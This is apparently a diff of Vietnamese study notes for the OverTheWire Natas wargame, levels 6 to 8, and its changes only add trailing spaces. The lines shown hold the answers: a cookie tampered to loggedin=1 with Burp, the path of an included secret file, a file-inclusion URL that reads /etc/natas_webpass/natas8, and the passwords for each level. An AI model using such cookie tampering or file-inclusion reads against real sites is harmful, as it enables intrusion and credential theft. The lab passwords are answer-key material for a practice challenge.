@@ -28,10 +28,10 @@ Dùng Burp intercept request để sửa cookie thành loggedin=1
 http://natas6.natas.labs.overthewire.org/includes/secret.inc  
 Secret: FOEIUWGHFEEUHOFUOIU  
 **user: natas7**  
-**pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**
+**pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**  
 ## Natas7
 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8  
 **user: natas8**  
-**pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**
+**pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**  
 ## Natas8
 
